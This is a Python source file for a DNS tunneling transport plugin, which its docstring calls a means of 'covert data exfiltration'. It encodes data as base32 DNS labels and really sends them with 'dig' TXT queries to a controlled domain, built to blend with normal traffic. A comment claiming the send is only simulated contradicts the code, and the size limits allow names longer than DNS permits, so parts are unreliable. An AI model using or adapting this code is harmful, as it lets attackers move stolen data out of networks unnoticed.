"""DNS tunneling transport for covert data exfiltration."""

import asyncio
import base64
import logging
from typing import Optional

from ecfs.plugins.base import TransportPlugin, TransportStatus, TransportType

logger = logging.getLogger(__name__)


class DNSTunnelTransport(TransportPlugin):
    """DNS tunneling transport for covert data exfiltration.

    Encodes packets as DNS TXT record queries to a controlled domain.
    Low bandwidth but highly covert — blends with normal DNS traffic.
    """

    CHUNK_SIZE = 63  # Max label length in DNS
    MAX_ENCODED_LABEL = 63  # DNS label max

    def __init__(self, domain: str, dns_server: str = "8.8.8.8") -> None:
        self._domain = domain
        self._dns_server = dns_server
        self._status = TransportStatus.OFFLINE
        self._sequence: int = 0
        self._receive_queue: asyncio.Queue = asyncio.Queue()

    @property
    def name(self) -> str:
        return "dns"

    @property
    def transport_type(self) -> TransportType:
        return TransportType.COVERT

    @property
    def priority(self) -> int:
        return 50  # Medium priority — slow but stealthy

    @property
    def max_packet_size(self) -> int:
        return 200  # DNS is very low bandwidth

    async def initialize(self) -> None:
        self._status = TransportStatus.ONLINE
        self._sequence = 0
        logger.info("DNS tunnel initialized, domain=%s", self._domain)

    async def teardown(self) -> None:
        self._status = TransportStatus.OFFLINE

    def _encode_chunks(self, data: bytes) -> list[str]:
        """Encode packet bytes into DNS-safe labels."""
        encoded = base64.b32encode(data).decode().lower()
        # Remove padding
        encoded = encoded.rstrip("=")
        # Split into DNS-safe chunks (max 63 chars per label)
        chunks = []
        for i in range(0, len(encoded), self.CHUNK_SIZE):
            chunks.append(encoded[i : i + self.CHUNK_SIZE])
        return chunks

    def _decode_chunks(self, chunks: list[str]) -> bytes:
        """Decode DNS labels back to packet bytes."""
        encoded = "".join(chunks)
        # Re-add padding
        padding = (8 - len(encoded) % 8) % 8
        encoded += "=" * padding
        return base64.b32decode(encoded.upper())

    async def send_packet(self, data: bytes) -> bool:
        if len(data) > self.max_packet_size:
            logger.warning(
                "Packet too large for DNS transport: %d bytes", len(data)
            )
            return False
        try:
            chunks = self._encode_chunks(data)
            # Build subdomain: <seq>.<chunk1>.<chunk2>...ecfs.<domain>
            subdomain = ".".join(chunks)
            query = f"{self._sequence}.{subdomain}.ecfs.{self._domain}"
            self._sequence += 1

            # Simulate DNS lookup (real impl would use dig/nslookup or dnspython)
            logger.debug("DNS query: %s", query)

            # For now, we simulate the send by just logging
            # Real implementation would use asyncio DNS resolver
            proc = await asyncio.create_subprocess_exec(
                "dig",
                "+short",
                "TXT",
                query,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            return proc.returncode == 0
        except Exception:
            logger.exception("DNS send failed")
            self._status = TransportStatus.ERROR
            return False

    async def receive_packet(self) -> Optional[bytes]:
        try:
            return self._receive_queue.get_nowait()
        except asyncio.QueueEmpty:
            return None

    async def get_status(self) -> TransportStatus:
        return self._status

    def decode_from_query(self, subdomain: str) -> Optional[bytes]:
        """Decode a received DNS subdomain back to packet bytes.

        Accepts either the full query (seq.chunks.ecfs.domain) or just
        the data portion (seq.chunks).
        """
        try:
            parts = subdomain.split(".")
            # Find the "ecfs" separator to delimit data labels
            try:
                ecfs_idx = parts.index("ecfs")
            except ValueError:
                # No "ecfs" label — treat everything except first element as data
                data_parts = parts[1:]
            else:
                # Data is between seq (index 0) and ecfs
                data_parts = parts[1:ecfs_idx]
            if not data_parts:
                return None
            return self._decode_chunks(data_parts)
        except Exception:
            logger.exception("DNS decode failed")
            return None
